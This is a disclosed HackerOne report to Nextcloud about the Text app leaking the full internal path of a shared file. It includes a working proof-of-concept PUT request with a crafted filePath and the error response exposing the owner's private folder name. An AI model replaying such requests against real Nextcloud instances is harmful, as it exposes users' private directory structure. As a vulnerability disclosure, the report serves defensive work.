# Text app leaks file path of shared files

## Report Details
- **Report ID**: 1246721
- **URL**: https://hackerone.com/reports/1246721
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-06-28T17:37:05.283Z
- **Disclosed**: 2021-08-11T09:23:35.146Z

## Reporter
- **Username**: lukasreschkenc
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
By sending a request for a share without a README.md, the whole file path will be returned to the user:

```
PUT /apps/text/public/session/create?token=EHTs4P7kATowiMg HTTP/1.1
Host: cloud.nextcloud.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 93
Origin: https://cloud.nextcloud.com
Te: trailers
Connection: close

{"filePath":"//Readme.md","token":"EHTs4P7kATowiMg","guestName":"Bean","forceRecreate":false}
```

```
HTTP/1.1 500 Internal Server Error
Date: Mon, 28 Jun 2021 17:33:58 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Cache-Control: no-cache, no-store, must-revalidate
Content-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';frame-ancestors 'none'
Feature-Policy: autoplay 'none';camera 'none';fullscreen 'none';geolocation 'none';microphone 'none';payment 'none'
X-Robots-Tag: none
Strict-Transport-Security: max-age=15768000; includeSubDomains; preload
Referrer-Policy: no-referrer
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 1; mode=block
Content-Length: 49
Connection: close
Content-Type: application/json; charset=utf-8

"\/lukas\/files\/Private\/test-public\/Readme.md"
```

## Impact

Disclosure of the full file path. Here shared is "test-public" but it also states "Private" which is the parent folder.

## Attachments
No attachments
